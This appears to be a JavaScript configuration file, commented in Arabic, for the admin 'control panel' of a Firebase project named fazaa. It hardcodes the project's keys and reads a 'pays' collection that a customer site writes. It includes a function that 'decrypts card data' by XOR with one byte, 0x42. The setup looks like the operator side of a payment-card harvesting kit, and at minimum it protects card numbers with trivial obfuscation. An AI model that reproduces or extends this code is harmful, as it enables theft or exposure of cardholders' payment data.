// ═══════════════════════════════════════════════════════════
// إعدادات Firebase — مشروع فزعة fazaa-e035d
// لوحة التحكم تتصل بمشروع فزعة عبر Firestore فقط (بدون RTDB)
// المجموعة الرئيسية: pays (يكتبها موقع العملاء)
// ═══════════════════════════════════════════════════════════
const firebaseConfig = {
  apiKey: "AIzaSyDtdis9lsMO4_XEezhKltBizmc8VOhZRcA",
  authDomain: "fazaa-e035d.firebaseapp.com",
  projectId: "fazaa-e035d",
  storageBucket: "fazaa-e035d.firebasestorage.app",
  messagingSenderId: "252034503956",
  appId: "1:252034503956:web:c9393f0020f1420adb5e01",
  measurementId: "G-9266Q01KGV"
};

if (!firebase.apps.length) {
  firebase.initializeApp(firebaseConfig);
}

const db = firebase.firestore();
window.db = db;
window.firebaseApp = firebase;

// ═══════════════════════════════════════════════════════════
// فك تشفير بيانات البطاقة (XOR بـ 0x42) — نفس أسلوب موقع العملاء
// ═══════════════════════════════════════════════════════════
function xorDecrypt(str) {
  if (!str) return '';
  const text = String(str);
  try {
    // قد تكون البيانات قادمة مشفرة Base64 ثنائية — نحاول UTF-8 أولاً
    let result = '';
    for (let i = 0; i < text.length; i++) {
      result += String.fromCharCode(text.charCodeAt(i) ^ 0x42);
    }
    return result;
  } catch (e) {
    return text;
  }
}
window.xorDecrypt = xorDecrypt;